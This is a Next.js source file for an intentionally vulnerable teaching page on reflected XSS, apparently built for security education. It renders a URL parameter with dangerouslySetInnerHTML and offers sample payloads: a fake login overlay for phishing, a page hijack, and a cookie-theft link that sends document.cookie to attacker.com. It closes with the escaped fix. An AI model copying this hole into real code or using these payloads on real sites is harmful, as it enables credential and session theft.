'use client';

import { useSearchParams } from 'next/navigation';
import Link from 'next/link';
import { Suspense } from 'react';

function VulnerableContent() {
    const searchParams = useSearchParams();
    const name = searchParams.get('name') || '';

    return (
        <div className="min-h-screen bg-gradient-to-br from-red-50 to-orange-50 p-8">
            <div className="max-w-4xl mx-auto">
                <Link
                    href="/"
                    className="inline-block mb-6 text-blue-600 hover:text-blue-800 font-semibold"
                >
                    ← Back to Home
                </Link>

                <div className="bg-white rounded-lg shadow-xl p-8 mb-8">
                    <h1 className="text-3xl font-bold text-red-600 mb-4">
                        🚨 Vulnerable Page - Reflected XSS
                    </h1>

                    <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                        <p className="text-red-800">
                            <strong>⚠️ DANGER:</strong> This page is intentionally vulnerable to XSS attacks.
                            Any script in the URL will be executed!
                        </p>
                    </div>

                    <div className="mb-8">
                        <h2 className="text-2xl font-semibold text-gray-800 mb-4">
                            Welcome Message:
                        </h2>
                        {/* VULNERABLE: This will execute any HTML/JavaScript in the name parameter */}
                        <div
                            className="p-6 bg-gray-50 rounded-lg border-2 border-gray-200 text-gray-900"
                            dangerouslySetInnerHTML={{ __html: `Welcome, ${name || 'Guest'}!` }}
                        />
                    </div>

                    <div className="space-y-6">
                        <div>
                            <h3 className="text-xl font-bold text-gray-800 mb-3">
                                Try These Examples:
                            </h3>

                            <div className="space-y-4">
                                <div className="p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
                                    <h4 className="font-bold text-gray-800 mb-2">
                                        1. Simple Alert:
                                    </h4>
                                    <code className="block bg-white p-3 rounded text-sm overflow-x-auto mb-2 text-gray-900">
                                        ?name=&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;
                                    </code>
                                    <Link
                                        href="/vulnerable?name=<script>alert('XSS Attack!')</script>"
                                        className="inline-block px-4 py-2 bg-yellow-600 text-white rounded hover:bg-yellow-700"
                                    >
                                        Test This Attack
                                    </Link>
                                </div>

                                <div className="p-4 bg-orange-50 border border-orange-200 rounded-lg">
                                    <h4 className="font-bold text-gray-800 mb-2">
                                        2. Phishing Attack (Fake Login Form):
                                    </h4>
                                    <code className="block bg-white p-3 rounded text-sm overflow-x-auto mb-2 break-all text-gray-900">
                                        ?name=&lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center&quot;&gt;&lt;div style=&quot;background:white;padding:40px;border-radius:10px;max-width:400px&quot;&gt;&lt;h2 style=&quot;color:red;margin-bottom:20px&quot;&gt;⚠️ Session Expired&lt;/h2&gt;&lt;p style=&quot;margin-bottom:20px&quot;&gt;Please log in again:&lt;/p&gt;&lt;form onsubmit=&quot;alert('Credentials stolen!\\nUsername: ' + this.username.value + '\\nPassword: ' + this.password.value); return false;&quot;&gt;&lt;input name=&quot;username&quot; placeholder=&quot;Username&quot; style=&quot;width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:5px&quot;&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot; style=&quot;width:100%;padding:10px;margin-bottom:20px;border:1px solid #ccc;border-radius:5px&quot;&gt;&lt;button type=&quot;submit&quot; style=&quot;width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer&quot;&gt;Login&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;
                                    </code>
                                    <button
                                        onClick={() => {
                                            const phishingPayload = `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center"><div style="background:white;padding:40px;border-radius:10px;max-width:400px"><h2 style="color:red;margin-bottom:20px">⚠️ Session Expired</h2><p style="margin-bottom:20px">Please log in again:</p><form onsubmit="alert('Credentials stolen!\\nUsername: ' + this.username.value + '\\nPassword: ' + this.password.value); return false;"><input name="username" placeholder="Username" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:5px"><input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:20px;border:1px solid #ccc;border-radius:5px"><button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer">Login</button></form></div></div>`;
                                            window.location.href = `/vulnerable?name=${encodeURIComponent(phishingPayload)}`;
                                        }}
                                        className="inline-block px-4 py-2 bg-orange-600 text-white rounded hover:bg-orange-700 cursor-pointer"
                                    >
                                        Test Phishing Attack
                                    </button>
                                </div>

                                <div className="p-4 bg-red-50 border border-red-200 rounded-lg">
                                    <h4 className="font-bold text-gray-800 mb-2">
                                        3. Cookie/Session Theft:
                                    </h4>
                                    <code className="block bg-white p-3 rounded text-sm overflow-x-auto mb-2 text-gray-900">
                                        ?name=&lt;script&gt;alert('Cookie Data:\\n' + document.cookie);&lt;/script&gt;
                                    </code>
                                    <Link
                                        href="/vulnerable?name=<script>alert('Cookie Data:\\n' + document.cookie); fetch('https://attacker.com/steal?cookie=' + document.cookie).catch(()=>{});</script>"
                                        className="inline-block px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
                                    >
                                        Test Cookie Theft
                                    </Link>
                                    <p className="text-sm text-gray-600 mt-2">
                                        * In a real attack, cookies would be sent to an attacker's server
                                    </p>
                                </div>

                                <div className="p-4 bg-purple-50 border border-purple-200 rounded-lg">
                                    <h4 className="font-bold text-gray-800 mb-2">
                                        4. DOM Manipulation:
                                    </h4>
                                    <code className="block bg-white p-3 rounded text-sm overflow-x-auto mb-2 text-gray-900">
                                        ?name=&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Page Hijacked!&lt;/h1&gt;'&lt;/script&gt;
                                    </code>
                                    <button
                                        onClick={() => {
                                            const hijackPayload = `<script>document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:black;color:red;font-size:3rem;font-weight:bold">🚨 PAGE HIJACKED! 🚨</div>'</script>`;
                                            window.location.href = `/vulnerable?name=${encodeURIComponent(hijackPayload)}`;
                                        }}
                                        className="inline-block px-4 py-2 bg-purple-600 text-white rounded hover:bg-purple-700 cursor-pointer"
                                    >
                                        Test Page Hijack
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div className="p-6 bg-green-50 border-2 border-green-200 rounded-lg">
                            <h3 className="text-xl font-bold text-green-700 mb-3">
                                🛡️ How This Should Be Fixed:
                            </h3>
                            <div className="space-y-4 text-gray-700">
                                <div>
                                    <h4 className="font-semibold mb-1">❌ Vulnerable Code:</h4>
                                    <code className="block bg-white p-3 rounded text-sm text-gray-900">
                                        dangerouslySetInnerHTML=&#123;&#123; __html: `Welcome, $&#123;name&#125;!` &#125;&#125;
                                    </code>
                                </div>
                                <div>
                                    <h4 className="font-semibold mb-1">✅ Safe Alternative:</h4>
                                    <code className="block bg-white p-3 rounded text-sm text-gray-900">
                                        &lt;div&gt;Welcome, &#123;name&#125;!&lt;/div&gt;
                                    </code>
                                    <p className="text-sm mt-2 text-gray-600">
                                        React automatically escapes values in JSX, preventing XSS attacks.
                                    </p>
                                </div>
                                <div className="mt-4">
                                    <Link
                                        href="/safe"
                                        className="inline-block px-6 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 font-semibold"
                                    >
                                        See Safe Implementation →
                                    </Link>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default function VulnerablePage() {
    return (
        <Suspense fallback={<div className="min-h-screen flex items-center justify-center">Loading...</div>}>
            <VulnerableContent />
        </Suspense>
    );
}
